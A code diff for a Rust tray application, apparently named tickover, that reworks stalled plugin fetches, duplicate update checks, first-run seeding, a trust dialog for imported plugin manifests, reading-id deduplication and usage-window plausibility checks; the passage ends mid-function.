@@ -29,7 +29,7 @@ use tickover::plugin::registry::{
     self, RegistryEntry, RegistryIndex, RegistryPluginState, TrustDisclosure,
 };
 use tickover::plugin::signature;
-use tickover::plugin::{scheduler, seed};
+use tickover::plugin::{engine_http, engine_logfile, scheduler, seed, time as plugin_time};
 
 use tray_icon::{
     menu::{CheckMenuItem, Menu, MenuEvent, MenuItem, PredefinedMenuItem},
@@ -60,24 +60,32 @@ type Fetching = Rc<RefCell<HashMap<String, InFlight>>>;
 /// starts by the spawn check — but one that **hangs** was covered by nothing.
 /// Its plugin stayed marked in-flight for the life of the process and was
 /// never polled again: the row simply stopped changing, with no error to show
-/// for it. A thread cannot be killed, so what happens instead is that the app
-/// stops waiting for it (see [`FETCH_PATIENCE`]), and the result it may still
-/// send eventually is recognised as stale and dropped — by the generation,
-/// which is why a bare "is it fetching" flag isn't enough.
+/// for it. A thread cannot be killed, so past [`FETCH_PATIENCE`] this app says
+/// so once (`stall_logged`) and keeps waiting rather than starting a second
+/// thread beside the first — see [`Admission::Stalled`] for why a second
+/// thread is a cost, not a fix. Whenever the original fetch does eventually
+/// answer, its generation still matches (nothing ever replaced it), so the
+/// result lands exactly as if it had never been slow at all.
 #[derive(Debug, Clone, Copy)]
 struct InFlight {
     generation: u64,
     started: Instant,
+    /// Whether the "still running" line below has already been logged for
+    /// this fetch. Set the first tick past `FETCH_PATIENCE` finds it still
+    /// outstanding, checked every tick after — a fetch that never finishes
+    /// earns one line, not one every tick for the rest of the process's life.
+    stall_logged: bool,
 }
 
-/// How long a single fetch may be outstanding before this app gives up
-/// waiting and allows a fresh one.
+/// How long a single fetch may be outstanding before this app calls it out as
+/// unusually slow.
 ///
 /// Generous on purpose. A healthy fetch is a couple of HTTP requests with
 /// their own timeouts, so seconds; but a credential step can legitimately sit
-/// for a long time waiting for a user to answer an OS keychain prompt, and
-/// abandoning that quickly would ask again — a prompt every refresh instead of
-/// a row that went quiet.
+/// for a long time waiting for a user to answer an OS keychain prompt, and a
+/// log-file engine's walk can legitimately take a while over a large enough
+/// directory — calling either out too eagerly would be crying wolf on every
+/// refresh instead of naming a row that has genuinely gone quiet.
 const FETCH_PATIENCE: Duration = Duration::from_secs(600);
 
 /// What to do about a fetch asked for while one may already be in flight.
@@ -85,10 +93,18 @@ const FETCH_PATIENCE: Duration = Duration::from_secs(600);
 enum Admission {
     /// Nothing is in flight for this plugin.
     Start,
-    /// One is, but it has outstayed [`FETCH_PATIENCE`]; stop waiting on it.
-    Replace,
     /// One is, and it is still within its time.
     Wait,
+    /// One is, and it has outstayed [`FETCH_PATIENCE`] — still not replaced.
+    /// A thread cannot be killed, so "replacing" a stalled fetch used to
+    /// mean starting a second thread *beside* the first, not instead of it —
+    /// for a log-file engine's own walk, a second one over the same
+    /// directory while the first is still walking it, spawned again every
+    /// `FETCH_PATIENCE` for as long as the plugin stays stuck. Treated the
+    /// same as [`Self::Wait`] by every caller now; kept as its own variant
+    /// only because it is worth telling the operator about once (see
+    /// `InFlight::stall_logged`), which `Wait` never is.
+    Stalled,
 }
 
 /// Decide by how long the outstanding fetch (if any) has been running.
@@ -96,7 +112,7 @@ fn admit_fetch(in_flight_for: Option<Duration>, patience: Duration) -> Admission
     match in_flight_for {
         None => Admission::Start,
         Some(elapsed) if elapsed < patience => Admission::Wait,
-        Some(_) => Admission::Replace,
+        Some(_) => Admission::Stalled,
     }
 }
 
@@ -292,18 +308,13 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     app.set_autostart(autostart::is_enabled());
 
     // First-run seeding happens exactly once, here — never inside
-    // `load_plugins` (see that function's docs). The only other place the
-    // built-in manifests get (re)written is the explicit "Reset plugins"
-    // action (`seed::reseed_defaults`, in the `on_reset_plugins` handler
-    // below).
+    // `load_plugins` (see that function's docs) — and only on a truly fresh
+    // install (see `truly_fresh_install`'s own doc for why `dir`'s own
+    // emptiness is not that question). The only other place the built-in
+    // manifests get (re)written is the explicit "Reset plugins" action
+    // (`seed::reseed_defaults`, in the `on_reset_plugins` handler below).
     let seeded_dir = seed::plugins_dir();
-    if let Err(e) = seed::seed_if_empty(&seeded_dir) {
-        diag::line(format!(
-            "could not seed plugin manifests in {}: {e}",
-            seeded_dir.display()
-        ));
-    }
-    upgrade_builtin_manifests(&seeded_dir);
+    seed_and_upgrade_builtins(&seeded_dir);
     let plugins: Plugins = Rc::new(RefCell::new(load_plugins()));
     let cache: PluginCache = Rc::new(RefCell::new(HashMap::new()));
     let fetching: Fetching = Rc::new(RefCell::new(HashMap::new()));
@@ -343,6 +354,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     app.set_registry_new(ModelRc::from(registry_model.clone()));
     let registry_index_cache: RegistryIndexCache = Rc::new(RefCell::new(None));
     let registry_busy: RegistryBusy = Rc::new(RefCell::new(HashSet::new()));
+    // Whether a "Check updates" fetch is already in flight. Without this,
+    // a second click before the first reply lands spawns a second background
+    // fetch of the same `index.toml` — wasted network, and two
+    // `RegistryCheckMsg`s racing to be the one `apply_registry_check` last
+    // applies. Set the moment the click spawns the thread, cleared the moment
+    // its result (of either outcome) is drained below — never left set by a
+    // click whose thread failed to spawn at all.
+    let registry_checking: Rc<Cell<bool>> = Rc::new(Cell::new(false));
     // Unix seconds of the last successful "Check updates" — `None` renders
     // as Slint's own "Last checked: never" (`registry-status == 0`, never
     // touched here); `Some` drives the live "just now" → "Nm ago" relabeling
@@ -846,6 +865,26 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                         break 'import;
                     }
                 };
+                // A file picked off disk is exactly as third-party as one
+                // the registry would have downloaded — `analyze_trust` and
+                // the same dialog `handle_install_outcome` shows a registry
+                // install gate this path too, before anything is written.
+                // Nothing here special-cases a manifest that happens to
+                // read from a file already sitting on this machine: an
+                // imported `.toml` is not vetted by anything upstream of
+                // this point, unlike the bundled manifests `seed` writes,
+                // which are never routed through this callback at all.
+                let disclosure = registry::analyze_trust(&manifest, registry::TRUSTED_HOSTS);
+                if disclosure.requires_approval {
+                    let allowed_hosts = all_allowed_hosts(&manifest);
+                    if !show_trust_dialog(&manifest.id, &disclosure, &allowed_hosts) {
+                        diag::line(format!(
+                            "add-plugin: \"{}\" refused at the trust dialog",
+                            manifest.id
+                        ));
+                        break 'import;
+                    }
+                }
                 let dir = seed::plugins_dir();
                 if let Err(e) = std::fs::create_dir_all(&dir) {
                     diag::line(format!(
@@ -1050,7 +1089,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     {
         let weak = app.as_weak();
         let tx = registry_tx.clone();
+        let registry_checking = registry_checking.clone();
         app.on_check_updates(move || {
+            // A check already running answers for this click too — its
+            // result is on the way regardless of how many more times the
+            // button is pressed before it arrives.
+            if registry_checking.replace(true) {
+                return;
+            }
             if let Some(app) = weak.upgrade() {
                 app.set_registry_status(1); // checking — flips the button to "Checking…"
             }
@@ -1063,6 +1109,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 let _ = tx.send(fetch_registry_index(DEFAULT_REGISTRY_URL));
             });
             if spawned.is_err() {
+                // No thread means no result will ever arrive on `registry_rx`
+                // to clear the flag below — clear it here instead, or every
+                // click after this one would be refused for good.
+                registry_checking.set(false);
                 if let Some(app) = weak.upgrade() {
                     app.set_registry_status(2);
                     app.set_registry_error(ss("Could not start the update check"));
@@ -1205,11 +1255,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             // drawn on screen at the time — so the only thing it can produce
             // is an empty PNG reported as a success. Worse, it sometimes
             // does not return at all: roughly one run in ten aborts inside
-            // femtovg's `imgref` on `assertion failed: stride > 0`, and a
-            // release build has `panic = "abort"`, so that is the process
-            // gone. The window really is drawn — every screenshot of it on
-            // this platform was captured off the screen — so that is what
-            // the message points at.
+            // femtovg's `imgref` on `assertion failed: stride > 0`, taking
+            // the process down with it. The window really is drawn — every
+            // screenshot of it on this platform was captured off the screen
+            // — so that is what the message points at.
             #[cfg(target_os = "windows")]
             {
                 let _ = &weak;
@@ -1257,6 +1306,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let registry_model = registry_model.clone();
         let registry_index_cache = registry_index_cache.clone();
         let registry_busy = registry_busy.clone();
+        let registry_checking = registry_checking.clone();
         let last_registry_check = last_registry_check.clone();
         // Rising-edge state for the "settings sheet just opened" reload
         // below — a plain `Cell`, mirroring `tick_timer`'s own `ticks` Cell.
@@ -1282,11 +1332,16 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             // Plugin fetch results.
             let mut got = false;
             while let Ok((id, generation, plugin_readings)) = plugin_rx.try_recv() {
-                // A result from a fetch this app gave up waiting on (see
-                // `FETCH_PATIENCE`) belongs to a fetch that has since been
-                // replaced: dropping it keeps it from clearing the in-flight
-                // mark of the fetch now running, and from overwriting that
-                // fetch's newer reading with an older one.
+                // A result whose generation no longer matches what `fetching`
+                // has on record for this id: past `FETCH_PATIENCE` this app
+                // now waits rather than replaces (`Admission::Stalled`),
+                // so a live entry's generation never actually changes out
+                // from under an outstanding fetch any more — this is instead
+                // the plugin having been removed (or removed and reinstalled)
+                // while an old fetch for it was still running. Dropping it
+                // keeps that late arrival from clearing the in-flight mark of
+                // whatever fetch is current now, and from overwriting a newer
+                // reading with an older one.
                 if !result_is_current(fetching.borrow().get(&id).copied(), generation) {
                     continue;
                 }
@@ -1320,6 +1375,11 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
             // "Check updates" results.
             while let Ok(msg) = registry_rx.try_recv() {
+                // This reply is what the guard in `on_check_updates` was
+                // waiting for — cleared before `apply_registry_check` so a
+                // status callback it triggers can turn straight around into
+                // another check rather than finding one still "in flight".
+                registry_checking.set(false);
                 apply_registry_check(
                     &app,
                     msg,
@@ -1550,7 +1610,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 // happen in as small as the loop that needs it.
                 {
                     let ps = plugins.borrow();
-                    record_seen_windows(&ps, &current);
+                    record_seen_windows(&ps, &current, now);
                     for m in ps.iter().filter(|m| m.ping.is_some() && plugin_enabled(m)) {
                         // The filter above already established `plugin_enabled(m)`;
                         // passed as `true` rather than asked a second time. Checked
@@ -1660,6 +1720,55 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 /// for what "pure read" means and why it matters.
 fn load_plugins() -> Vec<PluginManifest> {
     load_plugins_from(&seed::plugins_dir())
+}
+
+/// Whether this machine has never once decided anything about a built-in
+/// manifest — the state [`seed_and_upgrade_builtins`] reads as "seed", and the
+/// only state it reads that way.
+///
+/// `config::builtin_migrated` is written for **every** entry in
+/// `seed::BUILTIN_UPGRADES` on the very first call `upgrade_builtin_manifests`
+/// ever makes, whatever the outcome for each — delivered, replaced, or left
+/// absent (see that function's own doc). So "no marker for any built-in" is
+/// not a state a settled install can wander back into by deleting files; the
+/// only way to be here is a `config.json` (and thus this whole app) that has
+/// never run [`upgrade_builtin_manifests`] at all.
+fn truly_fresh_install() -> bool {
+    seed::BUILTIN_UPGRADES
+        .iter()
+        .all(|u| config::builtin_migrated(u.id).is_none())
+}
+
+/// The two startup steps that ready the plugins folder, in the order and
+/// under the one condition a real launch runs them.
+///
+/// `seed::seed_if_empty` alone answers "does `dir` hold a `*.toml` at all" —
+/// which is exactly what made removing every built-in manifest at once
+/// indistinguishable from a folder that had never been seeded: an emptied
+/// `dir` and a never-seeded one satisfy `has_any_toml`'s check identically,
+/// so seeding fired again and undid the removal. [`truly_fresh_install`] is
+/// the question that actually distinguishes them, so it — not
+/// `seed_if_empty`'s own directory read — is what gates the call. Once this
+/// install is no longer fresh, seeding never runs again for the rest of its
+/// life; [`upgrade_builtin_manifests`] is what a settled install relies on
+/// from here, including to deliver a built-in shipped for the first time
+/// after that install's first launch (`deliver_if_absent`).
+///
+/// Split out from `main` so a test can run exactly this sequence — the seed
+/// step's own bug (or fix) is invisible to a test that calls
+/// `upgrade_builtin_manifests` alone, which is exactly how the regression
+/// this function fixes went unnoticed by the tests already guarding
+/// `upgrade_builtin_manifests`.
+fn seed_and_upgrade_builtins(dir: &std::path::Path) {
+    if truly_fresh_install() {
+        if let Err(e) = seed::seed_if_empty(dir) {
+            diag::line(format!(
+                "could not seed plugin manifests in {}: {e}",
+                dir.display()
+            ));
+        }
+    }
+    upgrade_builtin_manifests(dir);
 }
 
 /// Bring untouched copies of the built-in manifests up to the version this
@@ -1790,10 +1899,15 @@ fn upgrade_builtin_manifests(dir: &std::path::Path) {
 /// which does not exist yet at this point in startup, and would be the claim
 /// that is actually wrong in both of those cases.
 ///
-/// The `exists` check on the `Absent` outcome, where the caller already knows
-/// the file was not read, is not redundant: `seed::upgrade_builtin` answers
-/// `Absent` for anything `read_regular_file` refuses, a directory at that path
-/// included, and "not in the plugins folder" would then be false.
+/// The `exists` check earns its place on the "already settled" call above
+/// (where nothing has asked `seed::upgrade_builtin` anything this launch) —
+/// it is what tells a genuinely missing file apart from one this function has
+/// no other way to ask about. It is *not* standing in for
+/// `seed::upgrade_builtin`'s own classification: `UpgradeAction::Absent`
+/// means exactly what `exists()` returning `false` means (no directory entry
+/// at all), never a directory or a dangling symlink at that path — anything
+/// `read_regular_file` refuses instead is `UpgradeAction::Unreadable`, said
+/// with its own line at the call site, not this one.
 fn decided_yet_absent(dir: &std::path::Path, upgrade: &seed::BuiltinUpgrade) -> Option<String> {
     if dir.join(upgrade.file).exists() {
         return None;
@@ -1872,6 +1986,13 @@ fn load_plugins_from(dir: &std::path::Path) -> Vec<PluginManifest> {
         })
         .collect();
     let manifests = dedup_plugin_ids(manifests);
+    // A backstop, not the primary defence any more: `dedup_plugin_ids` above
+    // already drops the later of any two manifests claiming one reading id,
+    // so this should find nothing on the set it just returned. Left in
+    // because it is cheap over an already-small list and it is the only
+    // thing standing between `owning_manifest` and a silent collision should
+    // some future caller ever hand it a `Vec<PluginManifest>` assembled some
+    // other way.
     for id in colliding_reading_ids(&manifests) {
         diag::line(format!(
             "two plugin manifests both claim the reading id \"{id}\" (a plugin id and another \
@@ -1910,23 +2031,40 @@ fn colliding_reading_ids(manifests: &[PluginManifest]) -> Vec<String> {
         .collect()
 }
 
-/// Drop every manifest after the first with a given `id`. `manifests` is
-/// already sorted by `order`, ties by `id` (see `plugin::manifest::load_dir`),
-/// so "first" here is well-defined and stable — the lowest-`order` (then
-/// lowest-`id`) manifest always wins a duplicate. Runs over every
-/// successfully-parsed manifest regardless of `enabled`, so a disabled
-/// well-known manifest still shadows a stray third-party one claiming the
-/// same id. Split out from [`load_plugins`] so the dedup rule itself is a
-/// pure, directly testable function.
+/// Drop every manifest after the first with a given `id`, **and** every
+/// manifest after the first to claim a given reading id.
+///
+/// `manifests` is already sorted by `order`, ties by `id` (see
+/// `plugin::manifest::load_dir`), so "first" here is well-defined and stable —
+/// the lowest-`order` (then lowest-`id`) manifest always wins a duplicate.
+/// Runs over every successfully-parsed manifest regardless of `enabled`, so a
+/// disabled well-known manifest still shadows a stray third-party one
+/// claiming the same id (or the same reading id). Split out from
+/// [`load_plugins`] so the dedup rule itself is a pure, directly testable
+/// function.
+///
+/// The reading-id half exists beside the plain-id one, not instead of it,
+/// because two *different* plugin ids can still spell the same reading id:
+/// [`surface_reading_id`] flattens a plugin id and a surface id into one
+/// string, and a third-party plugin id'd `claude-cli` collides with plugin
+/// `claude`'s `cli` surface the same way a duplicate id does. `owning_manifest`
+/// already refuses to answer for a reading id two *loaded* manifests both
+/// claim — this is what keeps that refusal from ever being reached in the
+/// first place: without it, both manifests would still produce a
+/// `ProviderReading` under the identical id, and `refresh_model` would key
+/// both onto the same window-model cache slot (`reconcile_window_model`,
+/// `reconcile_balance_model`), so one provider's card and hover state would
+/// intermittently show the other's rows rather than draw a plainly-broken
+/// screen. Losing the whole later manifest, the same as a duplicate plain id,
+/// is what a screen behaving consistently for the survivor costs.
 fn dedup_plugin_ids(manifests: Vec<PluginManifest>) -> Vec<PluginManifest> {
     let ids: Vec<String> = manifests.iter().map(|m| m.id.clone()).collect();
-    let mut seen: HashSet<String> = HashSet::new();
+    let mut seen_ids: HashSet<String> = HashSet::new();
+    let mut claimed_reading_ids: HashSet<String> = HashSet::new();
     manifests
         .into_iter()
         .filter(|m| {
-            if seen.insert(m.id.clone()) {
-                true
-            } else {
+            if !seen_ids.insert(m.id.clone()) {
                 // The version and the whole loaded set, because the message
                 // without them is unactionable: it says a duplicate arrived
                 // and nothing about where from, and a folder holding one file
@@ -1937,8 +2075,29 @@ fn dedup_plugin_ids(manifests: Vec<PluginManifest>) -> Vec<PluginManifest> {
                     m.version,
                     ids.join(", ")
                 ));
-                false
+                return false;
             }
+            let own_reading_ids: Vec<String> = m
+                .surface
+                .iter()
+                .map(|s| surface_reading_id(&m.id, &s.id))
+                .collect();
+            if let Some(collision) = own_reading_ids
+                .iter()
+                .find(|rid| claimed_reading_ids.contains(*rid))
+            {
+                diag::line(format!(
+                    "ignoring plugin manifest \"{}\" version \"{}\": its reading id \"{collision}\" \
+                     is already claimed by an earlier-loaded plugin (keeping the earlier one); \
+                     loaded set was [{}]",
+                    m.id,
+                    m.version,
+                    ids.join(", ")
+                ));
+                return false;
+            }
+            claimed_reading_ids.extend(own_reading_ids);
+            true
         })
         .collect()
 }
@@ -2043,7 +2202,13 @@ fn find_plugin_manifest_path(dir: &std::path::Path, id: &str) -> Option<std::pat
         if path.extension().and_then(|e| e.to_str()) != Some("toml") {
             continue;
         }
-        if let Ok(text) = std::fs::read_to_string(&path) {
+        // Bounded and FIFO-safe: this scans every `*.toml` in the plugins
+        // folder, so a name ending `.toml` is no guarantee of what is
+        // actually behind it — the same reasoning `read_regular_file`'s own
+        // doc gives for every other manifest read.
+        if let Some(text) =
+            tickover::plugin::read_regular_file(&path, tickover::plugin::SMALL_FILE_MAX_BYTES)
+        {
             if let Ok(m) = PluginManifest::from_str(&text) {
                 if m.id == id {
                     return Some(path);
@@ -2427,6 +2592,29 @@ fn plugin_options(m: &PluginManifest) -> BTreeMap<String, bool> {
 
 // ── Fetch scheduling ─────────────────────────────────────────────────────
 
+/// Drain every engine/auth module's own diagnostic queue and hand each line
+/// to [`diag::line`] — the one place any of them can actually reach it, since
+/// none of `auth`, `engine_http`, `engine_logfile` or `plugin::time` can call
+/// into this binary crate's `diag` directly (see `auth::PENDING_DIAGNOSTICS`'s
+/// own doc for why). Called right after a fetch that might have filled any of
+/// them, rather than on a timer: a queue not drained this pass is drained the
+/// next one, so nothing waits longer than one `refresh_secs` tick to actually
+/// reach the log.
+fn drain_engine_diagnostics() {
+    for line in auth::take_pending_diagnostics() {
+        diag::line(line);
+    }
+    for line in engine_http::take_pending_diagnostics() {
+        diag::line(line);
+    }
+    for line in engine_logfile::take_pending_diagnostics() {
+        diag::line(line);
+    }
+    for line in plugin_time::take_pending_diagnostics() {
+        diag::line(line);
+    }
+}
+
 /// Kick off a background fetch for one plugin, unless it is disabled, or a
 /// fetch is already in flight for it (dedup by plugin id, so any number of
 /// plugins can be tracked with one `fetching` map). `active_surface_ids`/
@@ -2447,14 +2635,34 @@ fn spawn_plugin_fetch(
     let generation = next_fetch_generation();
     {
         let mut in_flight = fetching.borrow_mut();
-        let elapsed = in_flight.get(&m.id).map(|f| f.started.elapsed());
+        let existing = in_flight.get(&m.id).copied();
+        let elapsed = existing.map(|f| f.started.elapsed());
         match admit_fetch(elapsed, FETCH_PATIENCE) {
             Admission::Wait => return,
-            Admission::Replace => diag::line(format!(
-                "plugin \"{}\": fetch still running after {}s — starting a fresh one",
-                m.id,
-                FETCH_PATIENCE.as_secs()
-            )),
+            // Never a second thread walking this plugin's own fetch
+            // while the first one still is — logged once per stall (not
+            // once per tick) by marking the existing entry rather than
+            // replacing it, and otherwise treated exactly like `Wait`: no
+            // insert, no spawn, below.
+            Admission::Stalled => {
+                if let Some(f) = existing {
+                    if !f.stall_logged {
+                        diag::line(format!(
+                            "plugin \"{}\": fetch still running after {}s, not starting another",
+                            m.id,
+                            FETCH_PATIENCE.as_secs()
+                        ));
+                        in_flight.insert(
+                            m.id.clone(),
+                            InFlight {
+                                stall_logged: true,
+                                ..f
+                            },
+                        );
+                    }
+                }
+                return;
+            }
             Admission::Start => {}
         }
         in_flight.insert(
@@ -2462,6 +2670,7 @@ fn spawn_plugin_fetch(
             InFlight {
                 generation,
                 started: Instant::now(),
+                stall_logged: false,
             },
         );
     }
@@ -2484,16 +2693,7 @@ fn spawn_plugin_fetch(
             tx: Some(tx),
         };
         let readings = scheduler::fetch(&manifest, &active_surface_ids, &options);
-        // `auth::oauth_refresh_step`'s client discovery can only queue a
-        // diagnostic (`auth::PENDING_DIAGNOSTICS`) — it has no way to reach
-        // `diag::line` itself (see that queue's own doc). Drained here,
-        // right after the fetch that might have filled it, rather than on a
-        // timer: a queue not drained this pass is drained the next one, and
-        // draining after every fetch means nothing waits longer than one
-        // `refresh_secs` tick to actually reach the log.
-        for line in auth::take_pending_diagnostics() {
-            diag::line(line);
-        }
+        drain_engine_diagnostics();
         guard.finish(readings);
     });
     if spawned.is_err() {
@@ -2515,6 +2715,12 @@ fn spawn_plugin_fetch(
 /// rows go quiet until the next fetch restores them, which is a great deal
 /// better than the plugin staying marked in-flight and never being polled
 /// again.
+///
+/// "Unwinding through it" is the load-bearing word. This crate's release
+/// profile does not set `panic = "abort"` (see `Cargo.toml` for why), so a
+/// panic on this fetch thread unwinds the same way it does in a debug or
+/// test build — running `drop` before the thread ends — in the shipped
+/// binary too, not only under `cargo test`.
 struct FetchGuard {
     id: String,
     /// Which fetch this is, so a result that arrives after the app stopped
@@ -2571,9 +2777,7 @@ fn sync_fetch_all(plugins: &[PluginManifest]) -> HashMap<String, Vec<ProviderRea
             let readings = scheduler::fetch(m, &active_surface_ids(m), &plugin_options(m));
             // Same drain as `spawn_plugin_fetch`'s background thread — this
             // is the other of the two places `scheduler::fetch` runs from.
-            for line in auth::take_pending_diagnostics() {
-                diag::line(line);
-            }
+            drain_engine_diagnostics();
             (m.id.clone(), readings)
         })
         .collect()
@@ -2643,12 +2847,13 @@ fn first_surface_reading_id(m: &PluginManifest) -> Option<String> {
 /// on the other's card.
 ///
 /// Answering nothing is the safe half of a real cost, not a free one: **both**
-/// providers then lose their remembered boundary, so the innocent one loses its
-/// hysteresis row *and* its auto-ping (which needs that boundary once the
-/// window stops being reported). That is why the collision is reported at load
-/// time ([`colliding_reading_ids`]) instead of quietly degrading — the fix is
-/// for one of the two to be renamed or removed, and nobody can do that without
-/// being told.
+/// providers would lose their remembered boundary, so the innocent one would
+/// lose its hysteresis row *and* its auto-ping (which needs that boundary once
+/// the window stops being reported). In practice that cost is no longer paid:
+/// [`dedup_plugin_ids`] refuses the *later* of any two manifests claiming one
+/// reading id before either ever reaches a live `plugins` list, logging which
+/// one lost — this refusal is the backstop for a `plugins` slice assembled
+/// some other way (a future caller, a test) rather than the everyday path.
 fn owning_manifest<'a>(
     plugins: &'a [PluginManifest],
     reading_id: &str,
@@ -3019,15 +3224,62 @@ fn declared_period_minutes(m: &PluginManifest, role: Role) -> Option<u64> {
 /// stating it would keep the old one indefinitely. That is the accepted side of
 /// the trade — the alternative, unlearning a length on any response that omits
 /// it, is the defect this rule was written to remove.
+///
+/// A ceiling for when no period is known at all — a window whose length has
+/// never been stated cannot be judged by "two periods", so it is judged
+/// against this instead. Chosen a little past the longest period this app
+/// actually knows of (Codex's weekly window), so a window with no length yet
+/// is never held to a tighter bound than one that has already stated its
+/// longest.
+const SEEN_AT_MAX_DAYS_AHEAD_WITHOUT_A_PERIOD: u64 = 8;
+
+/// Whether `at` is close enough to `now` to be worth remembering at all, given
+/// what (if anything) is known about the window's length.
+///
+/// Two periods of whatever length is known, or [`SEEN_AT_MAX_DAYS_AHEAD_WITHOUT_A_PERIOD`]
+/// days when none is: generous beside any real window, since the only thing
+/// this stands between is a reset so implausible it can only be a bug —
+/// `resets_at` sent in milliseconds, or a manifest's `period.assumed` so far
+/// off that the arithmetic it feeds lands the boundary years out — not a
+/// judgement call about how long a *real* subscription window is allowed to
+/// run.
+fn seen_at_is_plausible(at: u64, period_minutes: Option<u64>, now: u64) -> bool {
+    let max_ahead = match period_minutes.filter(|m| *m > 0) {
+        Some(m) => m.saturating_mul(60).saturating_mul(2),
+        None => SEEN_AT_MAX_DAYS_AHEAD_WITHOUT_A_PERIOD * 24 * 3600,
+    };
+    at <= now.saturating_add(max_ahead)
+}
 fn seen_merge(
     previous: Option<config::SeenWindow>,
     stated: config::SeenWindow,
+    now: u64,
 ) -> Option<config::SeenWindow> {
+    // Whichever of the two states a length, since that is the length the
+    // window on disk will actually end up with either way — see the
+    // inheritance below.
+    let period = stated
+        .period_minutes
+        .or(previous.and_then(|p| p.period_minutes));
+    if !seen_at_is_plausible(stated.at, period, now) {
+        // A reading this implausible is worth nothing: recording it — even
+        // as a rejected-for-being-stale comparison a later, honest reading
+        // would have to beat — is exactly how a single bad response used to
+        // poison the registry until a hand edit.
+        return None;
+    }
     let Some(previous) = previous else {
         return Some(stated);
     };
     if stated.at < previous.at {
-        return None;
+        // Forward-only, with one exception: a `previous` that is itself
+        // implausible has no claim on being "newer" that a smaller, honest
+        // value should have to lose to. This is the registry's only way
+        // back from a poisoned entry — nothing else in this loop ever moves
+        // a boundary backward.
+        if seen_at_is_plausible(previous.at, period, now) {
+            return None;
+        }
     }
     let merged = config::SeenWindow {
         at: stated.at,
@@ -3099,8 +3351,13 @@ fn seen_window_of(
 /// the panel's hysteresis needs the boundary of any provider that goes quiet,
 /// and a registry only third-party manifests happened to be excluded from would
 /// have failed silently for exactly them.
-fn record_seen_windows(plugins: &[PluginManifest], readings: &[ProviderReading]) {
-    for rec in seen_writes(seen_records(plugins, readings), seen_window_for) {
+///
+/// `now` comes from the caller rather than being read again here: it is the
+/// same tick's `now_unix()` the auto-ping loop right after this one uses, so a
+/// reading judged implausible-far-out by [`seen_at_is_plausible`] cannot
+/// disagree with itself between the two calls.
+fn record_seen_windows(plugins: &[PluginManifest], readings: &[ProviderReading], now: u64) {
+    for rec in seen_writes(seen_records(plugins, readings), seen_window_for, now) {
         let Some(key) = seen_role_key(rec.role) else {
             continue;
         };
@@ -3121,6 +3378,7 @@ fn record_seen_windows(plugins: &[PluginManifest], readings: &[ProviderReading])
 fn seen_writes<'a>(
     stated: Vec<SeenRecord<'a>>,
     previous: impl Fn(&PluginManifest, &str, Role) -> Option<config::SeenWindow>,
+    now: u64,
 ) -> Vec<SeenRecord<'a>> {
     let mut out: Vec<SeenRecord<'a>> = Vec::new();
     for rec in stated {
@@ -3138,7 +3396,7 @@ fn seen_writes<'a>(
             Some(i) => Some(out[i].seen),
             None => previous(rec.manifest, &rec.reading_id, rec.role),
         };
-        let Some(merged) = seen_merge(known, rec.seen) else {
+        let Some(merged) = seen_merge(known, rec.seen, now) else {
             continue;
         };
         match same {
@@ -3173,13 +3431,46 @@ const ASSUMED_WINDOW_SECS: u64 = 5 * 3600;
 /// five-hour window and larger than any spawn-and-answer takes.
 const PING_GRACE_SECS: u64 = 120;
 
-/// When the 5-hour window currently on screen began.
+/// The floor under [`ping_due`]'s whole arithmetic: whatever `window_start`
+/// and a `pinged_at` claim about when a window began, this plugin is never
+/// pinged twice inside one of these. Ten minutes is generous beside the grace
+/// above — it exists for a different failure than [`PING_GRACE_SECS`] does.
+///
+/// The grace tells apart two *correct* readings of one window. This floor
+/// assumes nothing about correctness at all: it is what actually stopped the
+/// storm a manifest declaring an implausibly short `period.assumed`, or a
+/// provider sending `resets_at` in milliseconds, used to cause — `start`
+/// computed from either lands far on the wrong side of `now`, and without a
+/// floor the loop above (`config::plugin_pinged_at` read fresh, compared,
+/// and — on every tick where the comparison came out wrong — written back to
+/// `now`) fires again on the very next tick, and the one after that, for as
+/// long as the bad arithmetic keeps saying so: on the order of an entire
+/// window's worth of one-second ticks, each one a spawned process and a
+/// config.json rewrite. Fixing `window_start`'s arithmetic closes the
+/// specific shapes this rule was found from; a hard floor stands regardless
+/// of whether some other shape of manifest or response finds a new one.
+const PING_MIN_INTERVAL_SECS: u64 = 10 * 60;
+
+/// When the 5-hour window currently on screen began, or `None` when the
+/// arithmetic below cannot place `now` inside a window at all — which
+/// [`ping_due`] then reads as "nothing to ping for", the same as any other
+/// unreadable state.
 ///
 /// Two shapes, because a provider names the same window differently before and
 /// after it starts reporting it:
 ///
 /// * **Stated** (`resets_at = Some`) — the window ends there and began one
-///   period earlier. Claude is always in this shape, including at 0% used.
+///   period earlier, *provided* that arithmetic actually places `now` inside
+///   it: `now` must be before the reset and no earlier than the computed
+///   start. Without both checks, a manifest whose `period.assumed` is far
+///   shorter than the real window (or a provider whose `resets_at` arrives in
+///   milliseconds rather than seconds — a valid `u64` either way, just wrong
+///   by three orders of magnitude) computes a `start` nowhere near `now`, and
+///   nothing before this stopped it: `resets_at` alone was never a promise
+///   that the window it names has begun. Claude is always in this shape,
+///   including at 0% used, and a live window always satisfies both checks
+///   trivially — the boundary they add is unreachable for anything actually
+///   running.
 /// * **Vanished** (`resets_at = None`) — Codex reports no 5-hour window at all
 ///   once it has nothing to report, so the window that is running now is the
 ///   one that began when the last *stated* reset passed (`seen_window`). Past
@@ -3188,7 +3479,8 @@ const PING_GRACE_SECS: u64 = 120;
 ///   value already recorded as pinged, and the provider — silent precisely
 ///   because no window started — would never supply a newer one. The retry
 ///   would then never come, which is the failure this whole rule exists to
-///   remove.
+///   remove. The projection is built from `now` and can only land at or
+///   before it, so this shape needs no extra check of its own.
 fn window_start(
     resets_at: Option<u64>,
     period_secs: u64,
@@ -3196,7 +3488,16 @@ fn window_start(
     now: u64,
 ) -> Option<u64> {
     match resets_at {
-        Some(reset) => Some(reset.saturating_sub(period_secs)),
+        Some(reset) => {
+            if now >= reset {
+                return None;
+            }
+            let start = reset.saturating_sub(period_secs);
+            if start > now {
+                return None;
+            }
